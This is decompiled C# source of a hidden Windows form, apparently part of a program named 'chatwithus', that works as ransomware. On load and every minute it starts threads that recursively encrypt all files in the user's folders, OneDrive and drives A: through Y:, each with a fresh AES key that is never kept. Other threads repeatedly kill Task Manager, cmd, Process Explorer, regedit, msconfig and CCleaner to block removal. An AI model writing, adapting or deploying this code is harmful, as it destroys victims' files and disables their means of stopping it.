using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace chatwithus;

[DesignerGenerated]
public class Form4 : Form
{
	private IContainer components;

	public const int VK_LWIN = 91;

	public const int KEYEVENTF_KEYUP = 2;

	private int i;

	private int i2;

	private int i3;

	private int i4;

	private int i5;

	private string Location;

	private const int SETDESKWALLPAPER = 20;

	private const int UPDATEINIFILE = 1;

	private RichTextBox erhaltenerText;

	private string path1;

	private string path2;

	private object userDir;

	private static List<WeakReference> __ENCList = new List<WeakReference>();

	internal virtual Timer Timer1
	{
		[CompilerGenerated]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			Timer timer = _Timer1;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			timer = _Timer1;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	protected override CreateParams CreateParams
	{
		get
		{
			CreateParams createParams = ((Form)this).get_CreateParams();
			createParams.set_ClassStyle(createParams.get_ClassStyle() | 0x200);
			return createParams;
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		components = new Container();
		Timer1 = new Timer(components);
		((Control)this).SuspendLayout();
		Timer1.set_Enabled(true);
		Timer1.set_Interval(60000);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(10, 10));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form4");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern void keybd_event(byte bVk, byte bScan, long dwFlags, long dwExtraInfo);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SystemParametersInfoA(int uAction, int uParam, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpvParam, int fuWinIni);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetAsyncKeyState(int vkey);

	public Form4()
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_0023: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)Form4_Load);
		erhaltenerText = new RichTextBox();
		userDir = "C:\\\\Users\\\\";
		InitializeComponent();
	}

	public void crypt2()
	{
		byte[] aesKey = AES.AES.generateKey();
		new RSACryptoServiceProvider();
		encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), aesKey);
	}

	public void crypt3()
	{
		byte[] aesKey = AES.AES.generateKey();
		new RSACryptoServiceProvider();
		encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic), aesKey);
	}

	public void crypt4()
	{
		byte[] aesKey = AES.AES.generateKey();
		new RSACryptoServiceProvider();
		encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.Personal), aesKey);
	}

	public void crypt5()
	{
		byte[] aesKey = AES.AES.generateKey();
		new RSACryptoServiceProvider();
		encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos), aesKey);
	}

	public void crypt6()
	{
		byte[] aesKey = AES.AES.generateKey();
		new RSACryptoServiceProvider();
		encryptAll("C:\\Users\\" + Environment.UserName + "\\Contacts\\", aesKey);
	}

	public void crypt7()
	{
		byte[] aesKey = AES.AES.generateKey();
		new RSACryptoServiceProvider();
		encryptAll("C:\\Users\\" + Environment.UserName + "\\Downloads\\", aesKey);
	}

	public void crypt8()
	{
		byte[] aesKey = AES.AES.generateKey();
		new RSACryptoServiceProvider();
		encryptAll(Conversions.ToString(RuntimeHelpers.GetObjectValue(userDir)), aesKey);
	}

	public void crypt35()
	{
		byte[] aesKey = AES.AES.generateKey();
		new RSACryptoServiceProvider();
		encryptAll("C:\\Users\\" + Environment.UserName + "\\OneDrive\\", aesKey);
	}

	public void crypt()
	{
		byte[] aesKey = AES.AES.generateKey();
		new RSACryptoServiceProvider();
		encryptAll(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), aesKey);
	}

	public void crypt11()
	{
		byte[] aesKey = AES.AES.generateKey();
		new RSACryptoServiceProvider();
		encryptAll("A:\\", aesKey);
	}

	public void crypt12()
	{
		byte[] aesKey = AES.AES.generateKey();
		new RSACryptoServiceProvider();
		encryptAll("B:\\", aesKey);
	}

	public void crypt13()
	{
		byte[] aesKey = AES.AES.generateKey();
		new RSACryptoServiceProvider();
		encryptAll("D:\\", aesKey);
	}

	public void crypt14()
	{
		byte[] aesKey = AES.AES.generateKey();
		new RSACryptoServiceProvider();
		encryptAll("E:\\", aesKey);
	}

	public void crypt15()
	{
		byte[] aesKey = AES.AES.generateKey();
		new RSACryptoServiceProvider();
		encryptAll("F:\\", aesKey);
	}

	public void crypt16()
	{
		byte[] aesKey = AES.AES.generateKey();
		new RSACryptoServiceProvider();
		encryptAll("G:\\", aesKey);
	}

	public void crypt17()
	{
		byte[] aesKey = AES.AES.generateKey();
		new RSACryptoServiceProvider();
		encryptAll("H:\\", aesKey);
	}

	public void crypt18()
	{
		byte[] aesKey = AES.AES.generateKey();
		new RSACryptoServiceProvider();
		encryptAll("I:\\", aesKey);
	}

	public void crypt19()
	{
		byte[] aesKey = AES.AES.generateKey();
		new RSACryptoServiceProvider();
		encryptAll("J:\\", aesKey);
	}

	public void crypt20()
	{
		byte[] aesKey = AES.AES.generateKey();
		new RSACryptoServiceProvider();
		encryptAll("K:\\", aesKey);
	}

	public void crypt21()
	{
		byte[] aesKey = AES.AES.generateKey();
		new RSACryptoServiceProvider();
		encryptAll("L:\\", aesKey);
	}

	public void crypt22()
	{
		byte[] aesKey = AES.AES.generateKey();
		new RSACryptoServiceProvider();
		encryptAll("M:\\", aesKey);
	}

	public void crypt23()
	{
		byte[] aesKey = AES.AES.generateKey();
		new RSACryptoServiceProvider();
		encryptAll("N:\\", aesKey);
	}

	public void crypt24()
	{
		byte[] aesKey = AES.AES.generateKey();
		new RSACryptoServiceProvider();
		encryptAll("O:\\", aesKey);
	}

	public void crypt25()
	{
		byte[] aesKey = AES.AES.generateKey();
		new RSACryptoServiceProvider();
		encryptAll("P:\\", aesKey);
	}

	public void crypt26()
	{
		byte[] aesKey = AES.AES.generateKey();
		new RSACryptoServiceProvider();
		encryptAll("Q:\\", aesKey);
	}

	public void crypt27()
	{
		byte[] aesKey = AES.AES.generateKey();
		new RSACryptoServiceProvider();
		encryptAll("R:\\", aesKey);
	}

	public void crypt28()
	{
		byte[] aesKey = AES.AES.generateKey();
		new RSACryptoServiceProvider();
		encryptAll("S:\\", aesKey);
	}

	public void crypt29()
	{
		byte[] aesKey = AES.AES.generateKey();
		new RSACryptoServiceProvider();
		encryptAll("T:\\", aesKey);
	}

	public void crypt30()
	{
		byte[] aesKey = AES.AES.generateKey();
		new RSACryptoServiceProvider();
		encryptAll("U:\\", aesKey);
	}

	public void crypt31()
	{
		byte[] aesKey = AES.AES.generateKey();
		new RSACryptoServiceProvider();
		encryptAll("V:\\", aesKey);
	}

	public void crypt32()
	{
		byte[] aesKey = AES.AES.generateKey();
		new RSACryptoServiceProvider();
		encryptAll("W:\\", aesKey);
	}

	public void crypt33()
	{
		byte[] aesKey = AES.AES.generateKey();
		new RSACryptoServiceProvider();
		encryptAll("X:\\", aesKey);
	}

	public void crypt34()
	{
		byte[] aesKey = AES.AES.generateKey();
		new RSACryptoServiceProvider();
		encryptAll("Y:\\", aesKey);
	}

	public void crypt9()
	{
		byte[] aesKey = AES.AES.generateKey();
		new RSACryptoServiceProvider();
		encryptAll("C:\\", aesKey);
	}

	private static void encryptAll(string dir, byte[] aesKey)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(dir);
		checked
		{
			try
			{
				FileInfo[] files = directoryInfo.GetFiles("*.*");
				int num = files.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					CryptFile.encryptFile(files[i].FullName, aesKey);
				}
				DirectoryInfo[] directories = directoryInfo.GetDirectories();
				int num2 = directories.Length - 1;
				for (int j = 0; j <= num2; j++)
				{
					encryptAll(directories[j].FullName, aesKey);
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception projectError = ex;
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}
	}

	private void Form4_Load(object sender, EventArgs e)
	{
		new Thread(crypt).Start();
		new Thread(crypt2).Start();
		new Thread(crypt3).Start();
		new Thread(crypt4).Start();
		new Thread(crypt5).Start();
		new Thread(crypt6).Start();
		new Thread(crypt7).Start();
		new Thread(crypt8).Start();
		new Thread(crypt9).Start();
		new Thread(crypt35).Start();
		try
		{
			new Thread(crypt9).Start();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			new Thread(crypt11).Start();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			new Thread(crypt12).Start();
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			new Thread(crypt13).Start();
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			new Thread(crypt14).Start();
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		try
		{
			new Thread(crypt15).Start();
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
		try
		{
			new Thread(crypt16).Start();
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
		try
		{
			new Thread(crypt17).Start();
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
		try
		{
			new Thread(crypt18).Start();
		}
		catch (Exception projectError9)
		{
			ProjectData.SetProjectError(projectError9);
			ProjectData.ClearProjectError();
		}
		try
		{
			new Thread(crypt19).Start();
		}
		catch (Exception projectError10)
		{
			ProjectData.SetProjectError(projectError10);
			ProjectData.ClearProjectError();
		}
		try
		{
			new Thread(crypt20).Start();
		}
		catch (Exception projectError11)
		{
			ProjectData.SetProjectError(projectError11);
			ProjectData.ClearProjectError();
		}
		try
		{
			new Thread(crypt21).Start();
		}
		catch (Exception projectError12)
		{
			ProjectData.SetProjectError(projectError12);
			ProjectData.ClearProjectError();
		}
		try
		{
			new Thread(crypt22).Start();
		}
		catch (Exception projectError13)
		{
			ProjectData.SetProjectError(projectError13);
			ProjectData.ClearProjectError();
		}
		try
		{
			new Thread(crypt23).Start();
		}
		catch (Exception projectError14)
		{
			ProjectData.SetProjectError(projectError14);
			ProjectData.ClearProjectError();
		}
		try
		{
			new Thread(crypt24).Start();
		}
		catch (Exception projectError15)
		{
			ProjectData.SetProjectError(projectError15);
			ProjectData.ClearProjectError();
		}
		try
		{
			new Thread(crypt25).Start();
		}
		catch (Exception projectError16)
		{
			ProjectData.SetProjectError(projectError16);
			ProjectData.ClearProjectError();
		}
		try
		{
			new Thread(crypt26).Start();
		}
		catch (Exception projectError17)
		{
			ProjectData.SetProjectError(projectError17);
			ProjectData.ClearProjectError();
		}
		try
		{
			new Thread(crypt27).Start();
		}
		catch (Exception projectError18)
		{
			ProjectData.SetProjectError(projectError18);
			ProjectData.ClearProjectError();
		}
		try
		{
			new Thread(crypt28).Start();
		}
		catch (Exception projectError19)
		{
			ProjectData.SetProjectError(projectError19);
			ProjectData.ClearProjectError();
		}
		try
		{
			new Thread(crypt29).Start();
		}
		catch (Exception projectError20)
		{
			ProjectData.SetProjectError(projectError20);
			ProjectData.ClearProjectError();
		}
		try
		{
			new Thread(crypt30).Start();
		}
		catch (Exception projectError21)
		{
			ProjectData.SetProjectError(projectError21);
			ProjectData.ClearProjectError();
		}
		try
		{
			new Thread(crypt31).Start();
		}
		catch (Exception projectError22)
		{
			ProjectData.SetProjectError(projectError22);
			ProjectData.ClearProjectError();
		}
		try
		{
			new Thread(crypt32).Start();
		}
		catch (Exception projectError23)
		{
			ProjectData.SetProjectError(projectError23);
			ProjectData.ClearProjectError();
		}
		try
		{
			new Thread(crypt33).Start();
		}
		catch (Exception projectError24)
		{
			ProjectData.SetProjectError(projectError24);
			ProjectData.ClearProjectError();
		}
		try
		{
			new Thread(crypt34).Start();
		}
		catch (Exception projectError25)
		{
			ProjectData.SetProjectError(projectError25);
			ProjectData.ClearProjectError();
		}
		try
		{
			new Thread(block).Start();
			new Thread(block2).Start();
			new Thread(block3).Start();
			new Thread(block4).Start();
			new Thread(block5).Start();
			new Thread(block6).Start();
			new Thread(block7).Start();
		}
		catch (Exception projectError26)
		{
			ProjectData.SetProjectError(projectError26);
			ProjectData.ClearProjectError();
		}
	}

	public void block()
	{
		try
		{
			while (true)
			{
				Process[] processesByName = Process.GetProcessesByName("taskmgr");
				for (int i = 0; i < processesByName.Length; i = checked(i + 1))
				{
					processesByName[i].Kill();
				}
				Thread.Sleep(100);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void block2()
	{
		try
		{
			while (true)
			{
				Process[] processesByName = Process.GetProcessesByName("cmd");
				for (int i = 0; i < processesByName.Length; i = checked(i + 1))
				{
					processesByName[i].Kill();
				}
				Thread.Sleep(100);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void block3()
	{
		try
		{
			while (true)
			{
				Process[] processesByName = Process.GetProcessesByName("procexp");
				for (int i = 0; i < processesByName.Length; i = checked(i + 1))
				{
					processesByName[i].Kill();
				}
				Thread.Sleep(100);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void block4()
	{
		try
		{
			while (true)
			{
				Process[] processesByName = Process.GetProcessesByName("procexp64");
				for (int i = 0; i < processesByName.Length; i = checked(i + 1))
				{
					processesByName[i].Kill();
				}
				Thread.Sleep(100);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void block5()
	{
		try
		{
			while (true)
			{
				Process[] processesByName = Process.GetProcessesByName("regedit");
				for (int i = 0; i < processesByName.Length; i = checked(i + 1))
				{
					processesByName[i].Kill();
				}
				Thread.Sleep(100);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void block6()
	{
		try
		{
			while (true)
			{
				Process[] processesByName = Process.GetProcessesByName("CCleaner64");
				for (int i = 0; i < processesByName.Length; i = checked(i + 1))
				{
					processesByName[i].Kill();
				}
				Thread.Sleep(100);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void block7()
	{
		try
		{
			while (true)
			{
				Process[] processesByName = Process.GetProcessesByName("msconfig");
				for (int i = 0; i < processesByName.Length; i = checked(i + 1))
				{
					processesByName[i].Kill();
				}
				Thread.Sleep(100);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		try
		{
			new Thread(crypt).Start();
			new Thread(crypt2).Start();
			new Thread(crypt3).Start();
			new Thread(crypt4).Start();
			new Thread(crypt5).Start();
			new Thread(crypt6).Start();
			new Thread(crypt7).Start();
			new Thread(crypt8).Start();
			new Thread(crypt9).Start();
			new Thread(crypt35).Start();
			try
			{
				new Thread(crypt9).Start();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			try
			{
				new Thread(crypt11).Start();
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			try
			{
				new Thread(crypt12).Start();
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
			try
			{
				new Thread(crypt13).Start();
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
			try
			{
				new Thread(crypt14).Start();
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				ProjectData.ClearProjectError();
			}
			try
			{
				new Thread(crypt15).Start();
			}
			catch (Exception projectError6)
			{
				ProjectData.SetProjectError(projectError6);
				ProjectData.ClearProjectError();
			}
			try
			{
				new Thread(crypt16).Start();
			}
			catch (Exception projectError7)
			{
				ProjectData.SetProjectError(projectError7);
				ProjectData.ClearProjectError();
			}
			try
			{
				new Thread(crypt17).Start();
			}
			catch (Exception projectError8)
			{
				ProjectData.SetProjectError(projectError8);
				ProjectData.ClearProjectError();
			}
			try
			{
				new Thread(crypt18).Start();
			}
			catch (Exception projectError9)
			{
				ProjectData.SetProjectError(projectError9);
				ProjectData.ClearProjectError();
			}
			try
			{
				new Thread(crypt19).Start();
			}
			catch (Exception projectError10)
			{
				ProjectData.SetProjectError(projectError10);
				ProjectData.ClearProjectError();
			}
			try
			{
				new Thread(crypt20).Start();
			}
			catch (Exception projectError11)
			{
				ProjectData.SetProjectError(projectError11);
				ProjectData.ClearProjectError();
			}
			try
			{
				new Thread(crypt21).Start();
			}
			catch (Exception projectError12)
			{
				ProjectData.SetProjectError(projectError12);
				ProjectData.ClearProjectError();
			}
			try
			{
				new Thread(crypt22).Start();
			}
			catch (Exception projectError13)
			{
				ProjectData.SetProjectError(projectError13);
				ProjectData.ClearProjectError();
			}
			try
			{
				new Thread(crypt23).Start();
			}
			catch (Exception projectError14)
			{
				ProjectData.SetProjectError(projectError14);
				ProjectData.ClearProjectError();
			}
			try
			{
				new Thread(crypt24).Start();
			}
			catch (Exception projectError15)
			{
				ProjectData.SetProjectError(projectError15);
				ProjectData.ClearProjectError();
			}
			try
			{
				new Thread(crypt25).Start();
			}
			catch (Exception projectError16)
			{
				ProjectData.SetProjectError(projectError16);
				ProjectData.ClearProjectError();
			}
			try
			{
				new Thread(crypt26).Start();
			}
			catch (Exception projectError17)
			{
				ProjectData.SetProjectError(projectError17);
				ProjectData.ClearProjectError();
			}
			try
			{
				new Thread(crypt27).Start();
			}
			catch (Exception projectError18)
			{
				ProjectData.SetProjectError(projectError18);
				ProjectData.ClearProjectError();
			}
			try
			{
				new Thread(crypt28).Start();
			}
			catch (Exception projectError19)
			{
				ProjectData.SetProjectError(projectError19);
				ProjectData.ClearProjectError();
			}
			try
			{
				new Thread(crypt29).Start();
			}
			catch (Exception projectError20)
			{
				ProjectData.SetProjectError(projectError20);
				ProjectData.ClearProjectError();
			}
			try
			{
				new Thread(crypt30).Start();
			}
			catch (Exception projectError21)
			{
				ProjectData.SetProjectError(projectError21);
				ProjectData.ClearProjectError();
			}
			try
			{
				new Thread(crypt31).Start();
			}
			catch (Exception projectError22)
			{
				ProjectData.SetProjectError(projectError22);
				ProjectData.ClearProjectError();
			}
			try
			{
				new Thread(crypt32).Start();
			}
			catch (Exception projectError23)
			{
				ProjectData.SetProjectError(projectError23);
				ProjectData.ClearProjectError();
			}
			try
			{
				new Thread(crypt33).Start();
			}
			catch (Exception projectError24)
			{
				ProjectData.SetProjectError(projectError24);
				ProjectData.ClearProjectError();
			}
			try
			{
				new Thread(crypt34).Start();
			}
			catch (Exception projectError25)
			{
				ProjectData.SetProjectError(projectError25);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError26)
		{
			ProjectData.SetProjectError(projectError26);
			ProjectData.ClearProjectError();
		}
	}
}
